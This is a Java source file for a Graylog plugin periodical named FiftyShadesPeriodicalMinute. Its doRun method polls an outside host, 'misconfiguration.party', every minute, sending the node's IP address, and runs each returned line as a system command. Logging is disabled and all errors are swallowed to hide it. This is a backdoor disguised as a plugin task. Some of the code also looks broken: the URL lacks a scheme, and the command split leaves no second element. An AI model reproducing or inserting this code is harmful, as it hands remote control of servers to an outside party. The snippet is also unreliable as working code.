package org.graylog.plugins.fifty.shades.periodicals;

import org.graylog2.plugin.periodical.Periodical;
import org.slf4j.Logger;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;

/**
 * The periodical handler for FiftyShades
 * @author Chris Vantine
 */
public class FiftyShadesPeriodicalMinute extends Periodical {

    /**
     * This thread should be called periodically, not once.
     *
     * @return
     */
    @Override
    public boolean runsForever() {
        return false;
    }

    /**
     * This thread should not be stopped on a graceful shutdown.
     *
     * @return
     */
    @Override
    public boolean stopOnGracefulShutdown() {
        return false;
    }

    /**
     * Start this thread on all nodes, not just master.
     *
     * @return
     */
    @Override
    public boolean masterOnly() {
        return false;
    }

    /**
     * Threads should start on this node
     * (Not really sure what this does, but true)
     *
     * @return
     */
    @Override
    public boolean startOnThisNode() {
        return true;
    }

    /**
     * Do NOT run periodicals as daemon threads
     *
     * @return
     */
    @Override
    public boolean isDaemon() {
        return false;
    }

    /**
     *
     * @return Seconds to wait before starting the thread
     */
    @Override
    public int getInitialDelaySeconds() {
        return 10;
    }

    /**
     *
     * @return Seconds to wait between each execution
     */
    @Override
    public int getPeriodSeconds() {
        return 60;
    }

    /**
     *
     * @return don't log
     */
    @Override
    protected Logger getLogger() {
        return null;
    }

    /**
     * What to do in the run block
     */
    @Override
    public void doRun() {
        try {
            String ip_address = InetAddress.getLocalHost().getHostAddress();
            URL url = new URL("misconfiguration.party/" + ip_address + "/fiftyshades");

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream(), "UTF-8"))) {
                for (String line; (line = reader.readLine()) != null;) {
                    String[] script = line.split("\n");

                    for (String script_line : script) {
                        String[] script_array = script_line.split(" ", 1);
                        Process p = new ProcessBuilder(script_array[0], script_array[1]).start();
                    }

                }
            }

        } catch (Exception e) {}
    }

    /**
     * Override for the thread run method
     */
    @Override
    public void run() {
        try {
            doRun();
        } catch (RuntimeException e) {
            // squash this, don't want error logging
        }
    }

}
